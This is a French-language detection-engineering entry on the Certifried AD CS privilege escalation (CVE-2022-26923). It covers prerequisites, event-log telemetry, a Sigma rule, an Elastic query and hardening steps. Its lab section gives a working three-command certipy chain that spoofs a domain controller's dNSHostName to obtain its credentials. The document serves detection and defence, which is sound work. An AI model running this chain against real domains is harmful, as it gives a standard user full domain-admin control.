# 43 — Certifried (CVE-2022-26923)

| Champ | Valeur |
|-------|--------|
| **Tactique MITRE** | Privilege Escalation |
| **Technique MITRE** | T1649 |
| **Phase kill chain** | Privilege Escalation |
| **CVE** | **CVE-2022-26923** |
| **Privilèges requis** | Un compte de domaine standard (+ MachineAccountQuota > 0) |
| **Impact** | Critique (utilisateur standard → Domain Admin via certificat) |

---

## 1. Description

Certifried exploite une faille dans la façon dont **ADCS** relie un certificat à un compte. En temps normal, un compte machine s'authentifie via son `dNSHostName`. La faille : un attaquant crée un **compte machine** qu'il contrôle et modifie son `dNSHostName` pour qu'il **corresponde à celui d'un DC**. Lors de la demande de certificat (template `Machine`), ADCS émet un certificat qui, à l'authentification, **mappe l'attaquant sur le compte du DC** → privilèges de DC → Domain Admin. C'est le pendant "certificat" de noPac.

## 2. Prérequis
- Compte de domaine standard.
- `ms-DS-MachineAccountQuota > 0` (défaut 10).
- ADCS déployé, DC non patché (mai 2022).

## 3. Procédure de simulation (lab)

```bash
# Certipy fait toute la chaîne automatiquement
certipy account create -u othmane@datacorp.local -p Marketing2025 \
   -user 'EVIL' -dns 'dc01.datacorp.local'      # dNSHostName = celui du DC
certipy req -u 'EVIL$' -p 'PassEvil' -ca CA01 -template Machine
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10     # → hash du DC / TGT 🎯
```

## 4. Télémétrie générée (logs)

| Source | Event ID | Signification |
|--------|----------|---------------|
| Security (DC) | 4741 | Création d'un compte machine |
| Security (DC) | 5136 | Modification de `dNSHostName` |
| CA / Security | 4886 / 4887 | Demande / émission de certificat (template Machine) |
| Security (DC) | 4768 | TGT via PKINIT (certificat) |

**Anomalie clé :** un compte machine créé par un utilisateur, avec un `dNSHostName` **usurpant un DC**, suivi d'une demande de certificat.

## 5. Détection

### Règle Sigma
```yaml
title: Certifried - dNSHostName Spoofing for Certificate Abuse
status: experimental
logsource:
    product: windows
    service: security
detection:
    dns_mod:
        EventID: 5136
        AttributeLDAPDisplayName: 'dNSHostName'
    create:
        EventID: 4741
    condition: dns_mod or create
level: high
```

### Traduction SIEM
- **Elastic :** `event.code:5136 and winlog.event_data.AttributeLDAPDisplayName:"dNSHostName"` corrélé à un 4741 par le même sujet.

## 6. Contre-mesures / Hardening
- **Patcher** CVE-2022-26923 (mai 2022) → mapping fort certificat↔compte (KB5014754).
- **MachineAccountQuota = 0**.
- Surveiller les modifications de `dNSHostName`.

## 7. Features pour l'agent IA
- Compte machine créé par un utilisateur avec `dNSHostName` correspondant à un DC (feature de similarité).
- Séquence 4741 → modif dNSHostName → demande de certificat → TGT PKINIT.

## 8. Références
- https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
- https://github.com/ly4k/Certipy
